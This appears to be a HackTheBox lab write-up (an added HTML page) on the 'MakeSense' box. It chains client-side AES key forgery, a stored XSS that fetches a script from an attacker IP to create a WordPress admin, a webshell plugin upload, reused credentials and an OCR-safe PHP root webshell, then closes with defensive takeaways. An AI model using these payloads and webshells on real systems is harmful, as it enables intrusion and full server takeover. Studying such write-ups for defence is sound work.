@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>MakeSense Writeup // Rahul Sharma</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600&display=swap">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <script src="../assets/js/theme.js"></script>
+</head>
+<body>
+
+<nav>
+  <div class="container nav-inner">
+    <div class="nav-logo"><a href="../index.html" style="color:inherit;">rahul<span>@sec</span>:~$</a></div>
+    <div class="nav-links">
+      <a href="../index.html">home</a>
+      <a href="../writeups.html" class="active">writeups</a>
+      <a href="../blog.html">blog</a>
+      <button id="theme-toggle" class="theme-toggle" type="button">☀</button>
+    </div>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="page-header">
+    <div class="breadcrumb">
+      <a href="../index.html">~</a>
+      <span class="sep">/</span>
+      <a href="../writeups.html">writeups</a>
+      <span class="sep">/</span>
+      makesense
+    </div>
+
+    <div style="display:flex;align-items:center;gap:16px;margin-bottom:16px;margin-top:16px;">
+      <div style="font-size:2.5rem;">🐧</div>
+      <div>
+        <h1 style="margin-bottom:6px;">MakeSense</h1>
+        <div style="display:flex;gap:8px;flex-wrap:wrap;">
+          <span class="badge badge-medium">Medium</span>
+          <span class="badge badge-linux">Linux</span>
+          <span class="badge badge-pwned">✓ Pwned</span>
+        </div>
+      </div>
+    </div>
+
+    <table style="width:auto;border-collapse:collapse;font-size:0.85rem;font-family:var(--font-mono);">
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">Date</td>
+        <td style="padding:4px 0;color:var(--text);">2026-07-05</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">OS</td>
+        <td style="padding:4px 0;color:var(--text);">Linux — Ubuntu 24.04 (kernel 6.8)</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">Stack</td>
+        <td style="padding:4px 0;color:var(--text);">WordPress (SQLite) · custom "webagency" theme (Transformers.js / Whisper) · Apache 2.4.58 · root PHP + Tesseract OCR service</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">CVE</td>
+        <td style="padding:4px 0;color:var(--green);">None — custom application logic (client-trusted crypto → stored XSS → OCR file-write RCE)</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="writeup-body">
+
+    <h2>Summary</h2>
+    <p>MakeSense is a chain built entirely on <strong>misplaced trust in the client</strong> — no public CVE, just an application that hands the browser things a browser should never be given. A "voice call" widget on a WordPress site ships its own AES key and does its own sanitisation, so we forge a submission and land a stored XSS against an automated admin. From there it's a WordPress admin-to-RCE, credential reuse, and finally a delightfully weird privesc: a root-owned OCR service that writes recognised text to a <code>.php</code> file — so we hand Tesseract a webshell.</p>
+    <ol style="margin-left:20px;margin-bottom:16px;color:var(--text);">
+      <li style="margin-bottom:6px;"><strong>Initial access</strong> — the theme's <code>whisper-wrapper.js</code> contains a hardcoded AES-GCM key and encrypts a user "voice message" client-side. We forge our own encrypted payload with an XSS body, store it via two unauthenticated AJAX actions, and an admin bot renders it in <code>wp-admin</code> → stored XSS creates an administrator → malicious plugin upload → shell as <code>www-data</code>.</li>
+      <li style="margin-bottom:6px;"><strong>Lateral movement</strong> — <code>wp-config.php</code> leaks <code>walter</code>'s DB password, reused for SSH → <code>user.txt</code>.</li>
+      <li style="margin-bottom:6px;"><strong>Privilege escalation</strong> — a root <code>php -S</code> OCR service (loopback, Basic-auth) saves OCR output to a web-served <code>.php</code> file. Tesseract can't read <code>_ ' " ` *</code>, so we write a webshell using only OCR-safe characters (<code>chr()</code> + <code>$GLOBALS</code>) → code execution as root.</li>
+    </ol>
+
+    <h2>Reconnaissance</h2>
+    <pre>nmap -sC -sV -p- makesense.htb
+22/tcp   open     ssh       OpenSSH 9.6p1 Ubuntu
+80/tcp   filtered http
+443/tcp  open     ssl/http  Apache/2.4.58 — "Agency LLC" (WordPress)
+8001/tcp filtered vcom-tunnel</pre>
+    <p>Two ports are <code>filtered</code> — a hint that 80 and 8001 exist but are firewalled from outside; remember 8001, it comes back for root. The HTTPS site is WordPress. The generator tag proudly claims <code>WordPress 7.0</code>, which doesn't exist — a spoofed version, so don't waste time on core CVEs. The interesting surface is the <strong>custom theme</strong>:</p>
+    <pre>curl -sk https://makesense.htb/ | grep -Eo 'themes/[^"]+|whisper|generator[^>]+'
+wp-content/themes/webagency/style.css
+wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js
+&lt;meta name="generator" content="WordPress 7.0"&gt;</pre>
+    <p>An author-enumeration via the REST API also confirms the admin and drops a hint about an internal service:</p>
+    <pre>curl -sk "https://makesense.htb/index.php?rest_route=/wp/v2/users/1"
+{"id":1,"name":"admin","url":"http://localhost:8000", ...}</pre>
+
+    <h2>Initial Access — Client-Trusted Crypto → Stored XSS</h2>
+    <p>The theme's "Call us" feature records audio, transcribes it in-browser with <a href="https://github.com/xenova/transformers.js" target="_blank">Transformers.js</a>/Whisper, and submits the result. Reading <code>whisper-wrapper.js</code> hands us the entire intended vulnerability:</p>
+    <pre>// whisper-wrapper.js
+const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';   // symmetric key, in the browser
+
+// Map spoken words to their symbol equivalents for XSS injection   ← their own comment
+const mappings = { 'open bracket':'&lt;', 'close bracket':'&gt;', 'slash':'/', 'quote':"'", ... };
+
+async encryptPayload(payload) {
+  const keyMaterial = await crypto.subtle.digest('SHA-256', encoder.encode(ENCRYPTION_KEY));
+  const iv = crypto.getRandomValues(new Uint8Array(12));           // 12-byte IV, AES-GCM
+  const encrypted = await crypto.subtle.encrypt({name:'AES-GCM', iv}, key, data);
+  // returns base64( IV || ciphertext || tag )
+}</pre>
+    <p>Two design decisions doom this: (1) the symmetric key lives in client JavaScript, and (2) a function literally named for "XSS injection" turns transcribed words into HTML symbols. The encrypted blob is posted to two <strong>unauthenticated</strong> AJAX actions whose nonce is printed in the page source:</p>
+    <pre>save_voice_raw       → creates a post, returns post_id
+save_voice_results   → decrypts {transcription, summary} and stores it as a `contact_submission`</pre>
+    <p>Because we hold the key and the wire format, the microphone and Whisper are irrelevant — we forge the ciphertext directly, putting an XSS string where the "transcription" should be:</p>
+    <pre>import json, base64, hashlib, requests
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+
+KEY  = hashlib.sha256(b'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI').digest()
+BASE = 'https://makesense.htb'; NONCE = '4c58dec735'          # nonce from page source
+
+def enc(p):
+    iv = get_random_bytes(12)
+    ct, tag = AES.new(KEY, AES.MODE_GCM, nonce=iv).encrypt_and_digest(json.dumps(p).encode())
+    return base64.b64encode(iv + ct + tag).decode()
+
+xss = "&lt;img src=x onerror=\"s=document.createElement('script');"\
+      "s.src='http://10.10.14.9:8000/x.js';document.head.appendChild(s)\"&gt;"
+pid = requests.post(f'{BASE}/wp-admin/admin-ajax.php',
+        data={'action':'save_voice_raw','nonce':NONCE}, verify=False).json()['data']['post_id']
+requests.post(f'{BASE}/wp-admin/admin-ajax.php', verify=False,
+        data={'action':'save_voice_results','nonce':NONCE,'post_id':pid,
+              'encrypted_payload': enc({'transcription':xss,'summary':xss})})</pre>
+    <p>The submission is a <code>contact_submission</code> post — not public (a direct hit returns 404), but reviewed inside <code>wp-admin</code> by an automated admin (a headless Chrome / Selenium bot, <code>prey-unified.py</code>). When the bot opens the submissions list, our <code>&lt;img onerror&gt;</code> fires in an authenticated admin session and pulls <code>x.js</code>, which uses the admin's own session to create a new administrator:</p>
+    <pre>// x.js  — runs as admin, creates an admin account
+let h = await (await fetch('/wp-admin/user-new.php', {credentials:'include'})).text();
+let nonce = h.match(/name="_wpnonce_create-user"\s+value="([a-f0-9]+)"/)[1];
+let b = new URLSearchParams({action:'createuser', _wpnonce_create-user:nonce,
+        user_login:'pwned', email:'pwned@makesense.htb', pass1:'P0wned!2345_xz',
+        pass2:'P0wned!2345_xz', role:'administrator', createuser:'Add New User'});
+await fetch('/wp-admin/user-new.php', {method:'POST', credentials:'include',
+        headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:b.toString()});</pre>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="terminal-title">XSS beacons (admin bot)</span>
+      </div>
+      <div class="terminal-body">
+        <div class="t-out">GET /x.js  ← from 10.129.x.x (the box)</div>
+        <div class="t-out">FIRED url=.../wp-admin/edit.php?post_type=contact_submission</div>
+        <div class="t-out">user-new status=200 isAdmin=true</div>
+        <div class="t-success">createuser created=true   → admin "pwned" added</div>
+      </div>
+    </div>
+
+    <p>Now a real admin, I log in. The theme/plugin file editor is present but the theme files aren't writable, so I take the reliable route — <strong>upload a plugin zip containing a webshell</strong> (it extracts under <code>wp-content/</code>, which the web user can write):</p>
+    <pre># minimal plugin zip: diagtool/diagtool.php = &lt;?php system($_REQUEST['c']); ?&gt;
+nonce=$(curl -sk -b cj "$BASE/wp-admin/plugin-install.php" | grep -oP 'name="_wpnonce" value="\K[a-f0-9]+')
+curl -sk -b cj -F "_wpnonce=$nonce" -F "pluginzip=@diagtool.zip" \
+     "$BASE/wp-admin/update.php?action=upload-plugin"
+
+curl -sk "$BASE/wp-content/plugins/diagtool/diagtool.php?c=id"
+# uid=33(www-data) gid=33(www-data)</pre>
+
+    <!-- ── SECTION 4: LATERAL MOVEMENT ─────────────────────────────────── -->
+    <h2>Lateral Movement — www-data → walter</h2>
+    <p>WordPress here runs on SQLite (the <code>sqlite-database-integration</code> plugin), so the "MySQL" credentials in <code>wp-config.php</code> are unused for the DB — but not useless. They're real system creds, reused:</p>
+    <pre>www-data$ grep -E "DB_USER|DB_PASSWORD" /var/www/html/wp-config.php
+define( 'DB_USER',     'walter' );
+define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
+
+ssh walter@makesense.htb           # password: JbhHDAEgXvri3!
+walter@makesense:~$ cat user.txt   # HTB{… redacted …}</pre>
+    <p>Enumerating as <code>walter</code>, the earlier "filtered 8001" hint pays off — there's a root-owned service on loopback:</p>
+    <pre>walter@makesense:~$ ps aux | grep -E '8001|ocr'
+root  php -S 127.0.0.1:8001 -t /root/ocr4/
+walter@makesense:~$ curl -s -I http://127.0.0.1:8001/
+HTTP/1.0 401 Unauthorized
+WWW-Authenticate: Basic realm="OCR Protected"</pre>
+
+    <h2>Privilege Escalation — Feeding Tesseract a Webshell</h2>
+    <p>The <code>:8001</code> service is a handwriting-OCR web app running <strong>as root</strong>, behind HTTP Basic auth — and walter's password is reused there too. It's a canvas you draw on; the backend OCRs the image with Tesseract and lets you <em>"Save as &lt;filename&gt;"</em>. Two facts make this fatal:</p>
+    <ul style="margin-left:20px;line-height:2;">
+      <li>The saved file's content is <strong>the OCR'd text</strong>, and it lands in <code>/root/ocr4/saved/</code> — which the root <code>php -S</code> server executes as PHP.</li>
+      <li>The filename is <code>basename()</code>-sanitised (no path traversal), <strong>but the <code>.php</code> extension is allowed</strong>.</li>
+    </ul>
+    <p>So if I can get Tesseract to output valid PHP, I can save <code>saved/x.php</code> and request it for root RCE. Proof of concept — an image of <code>&lt;?php echo 123; ?&gt;</code> round-trips perfectly and <em>executes</em>:</p>
+    <pre># recognise an image of "&lt;?php echo 123; ?&gt;", save as shell.php
+curl -s -u 'walter:JbhHDAEgXvri3!' http://127.0.0.1:8001/saved/shell.php
+123                       # ← PHP ran, as root</pre>
+    <p>The catch: Tesseract is <em>lossy on symbols</em>. Testing a real webshell, the OCR mangles exactly the characters PHP needs most:</p>
+    <pre>&lt;?php system($_GET[0]);?&gt;   →   &lt;?php system($ GET[O]) ;?&gt;      # "_" dropped, "0"→"O"
+&lt;?php echo `id`;?&gt;          →   &lt;?php echo 'id* ;?&gt;             # backticks → quote + "*"</pre>
+    <p>Underscores, single/double quotes, backticks and asterisks are unreliable. The trick is to write a webshell using <strong>only OCR-safe characters</strong> — no quotes, no underscores, no backticks. Build every needed string with <code>chr()</code> and reach the <code>$_GET</code> superglobal indirectly through <code>$GLOBALS</code>:</p>
+    <pre>&lt;?php system($GLOBALS[chr(95).chr(71).chr(69).chr(84)][1]);?&gt;
+                     └ '_'    'G'    'E'    'T' ┘        └ ?1=&lt;cmd&gt;</pre>
+    <p>That uses only <code>&lt; ? p h p ( ) [ ] . ; digits letters</code> — all of which Tesseract reads cleanly. Render it, verify the recognised text before saving, save as <code>r2.php</code>, and we have a reusable root webshell:</p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="terminal-title">root shell</span>
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">walter@makesense</span>:~$ <span class="t-cmd">curl -s -u walter:… 'http://127.0.0.1:8001/saved/r2.php?1=id'</span></div>
+        <div class="t-success">uid=0(root) gid=0(root) groups=0(root)</div>
+        <div><span class="t-prompt">walter@makesense</span>:~$ <span class="t-cmd">curl -s -u walter:… 'http://127.0.0.1:8001/saved/r2.php?1=cat%20/root/root.txt'</span></div>
+        <div class="t-success">HTB{… redacted …}</div>
+      </div>
+    </div>
+    <p>From here, <code>?1=</code> runs any command as root — drop an SSH key into <code>/root/.ssh/authorized_keys</code> for a stable root shell.</p>
+
+    <h2>Flags</h2>
+    <div class="flag-box">
+      <div class="flag-label">User Flag — /home/walter/user.txt</div>
+      <div class="flag-value">HTB{… redacted …}</div>
+    </div>
+    <div class="flag-box">
+      <div class="flag-label">Root Flag — /root/root.txt</div>
+      <div class="flag-value">HTB{… redacted …}</div>
+    </div>
+
+    <h2>Findings Summary</h2>
+    <table>
+      <thead><tr><th>Finding</th><th>Severity</th><th>Impact</th></tr></thead>
+      <tbody>
+        <tr><td>Hardcoded AES key + client-side encryption/sanitisation</td><td><span class="severity-high">High</span></td><td>Attacker forges any "trusted" payload the server accepts</td></tr>
+        <tr><td>Unauthenticated stored XSS via forged <code>contact_submission</code></td><td><span class="severity-critical">Critical</span></td><td>Account takeover of the reviewing admin → RCE as <code>www-data</code></td></tr>
+        <tr><td>Credential reuse: <code>wp-config.php</code> DB password = SSH password</td><td><span class="severity-high">High</span></td><td>Lateral movement to user <code>walter</code></td></tr>
+        <tr><td>Root OCR service writes recognised text to web-served <code>.php</code></td><td><span class="severity-critical">Critical</span></td><td>Arbitrary code execution as root</td></tr>
+      </tbody>
+    </table>
+
+    <h2>Defensive Takeaways</h2>
+    <ul style="margin-left:20px;color:var(--text);line-height:2;">
+      <li><strong>The client is not your server.</strong> A key in JavaScript is a public key, and client-side sanitisation is a suggestion. Anything the browser can do, an attacker can do directly — decrypt, re-encrypt, skip. Encrypt and validate <em>on the server</em>, treating all client input as hostile. More in my <a href="../blog/client-side-trust.html">notes on client-side trust</a>.</li>
+      <li><strong>Output-encode stored content, always.</strong> The XSS worked because a submission was rendered into the admin dashboard unescaped. Context-aware encoding (and a CSP) in <code>wp-admin</code> would have neutralised the whole first half of the chain — even for an "internal" review page.</li>
+      <li><strong>Automated reviewers are a live attack surface.</strong> A headless-browser bot that opens user-supplied content <em>is</em> a victim for stored XSS. Sandbox it, strip its privileges, and never review untrusted HTML in an authenticated admin context.</li>
+      <li><strong>Never reuse secrets across trust boundaries.</strong> One password served the (unused) DB config <em>and</em> SSH <em>and</em> the OCR Basic-auth. Reuse turned two dead-ends into a full path.</li>
+      <li><strong>Don't run helper services as root, and don't let user input choose filenames or extensions.</strong> The OCR app should have run unprivileged, written to a non-executable directory, and pinned a safe extension. Any one of those breaks the privesc. (And <code>127.0.0.1</code> didn't save it — see <a href="../blog/localhost-not-a-boundary.html">localhost is not a boundary</a>.)</li>
+    </ul>
+
+    <div style="margin-top:48px;padding-top:24px;border-top:1px solid var(--border);">
+      <a href="../writeups.html" class="btn btn-ghost">&larr; Back to Writeups</a>
+    </div>
+
+  </div>
+</div>
+
+<br><br>
+<footer>
+  <div class="container">
+    © 2026 <span>Rahul Sharma</span> &nbsp;·&nbsp; Security Engineer &nbsp;·&nbsp; HackTheBox writeups &amp; defensive security notes
+  </div>
+</footer>
+
+</body>
+</html>
